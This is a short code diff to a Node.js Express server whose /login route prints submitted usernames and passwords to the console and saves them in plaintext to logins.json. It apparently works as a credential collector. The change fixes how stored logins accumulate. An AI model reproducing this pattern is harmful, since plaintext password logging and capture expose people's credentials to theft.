@@ -6,7 +6,7 @@ import { fileURLToPath } from 'node:url'
 const DB_FILE = './logins.json'
 await fsp.writeFile(DB_FILE, '[]')
 
-const data = JSON.parse(await fsp.readFile(DB_FILE))
+let data = JSON.parse(await fsp.readFile(DB_FILE))
 
 const app = express()
 
@@ -18,16 +18,8 @@ app.use(express.urlencoded({ extended: true }))
 app.post('/login', async (req, res) => {
     const { username, password } = req.body
     console.log(username, password)
-    await fsp.writeFile(
-        DB_FILE,
-        JSON.stringify([
-            ...data,
-            {
-                username,
-                password
-            }
-        ])
-    )
+    data = [...data, { username, password }]
+    await fsp.writeFile(DB_FILE, JSON.stringify(data))
     res.sendFile(
         path.join(
             path.dirname(fileURLToPath(import.meta.url)),
